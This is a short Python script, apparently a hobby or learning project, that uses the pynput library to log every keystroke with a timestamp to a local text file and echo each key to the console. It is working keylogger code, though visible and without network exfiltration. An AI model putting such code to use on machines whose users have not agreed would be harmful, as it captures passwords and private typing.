# library for recording user input
import pynput

from pynput.keyboard import Key, Listener
# for logging keystrokes to the text file
import logging

# path to the text file
log_dir = "/home/plukas/github/pythonKey"
# format for the strokes> log_dir, time and the message
logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
# every key as paramether and log the information
def on_press(key):
    logging.info(str(key))
    print(f"Key logged: {key}")
# listener instance to find the on_press method and join it with the main thread 
with Listener(on_press=on_press) as listener:
    listener.join()
